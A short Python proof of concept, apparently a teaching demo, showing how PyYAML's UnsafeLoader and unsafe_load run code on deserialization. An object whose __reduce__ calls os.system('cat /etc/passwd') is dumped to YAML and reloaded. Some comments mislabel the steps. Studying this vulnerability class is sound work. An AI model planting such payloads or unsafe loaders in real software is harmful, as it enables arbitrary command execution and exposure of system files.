import yaml
from yaml import UnsafeLoader, Loader
import os

class Payload(object):
    def __reduce__(self):
        # -> int, tuple[str]]
        return (os.system, ('cat /etc/passwd', ))

# Serialization with pickle 
serialized_data = Payload()

# Deserialization with yaml
deserialized_data = yaml.dump(serialized_data)

# Scenario 1 - Unsafe Loader Parameter
print(yaml.load(deserialized_data, Loader=UnsafeLoader))

# Scenario 2 - Unsafe Load
print(yaml.unsafe_load(deserialized_data))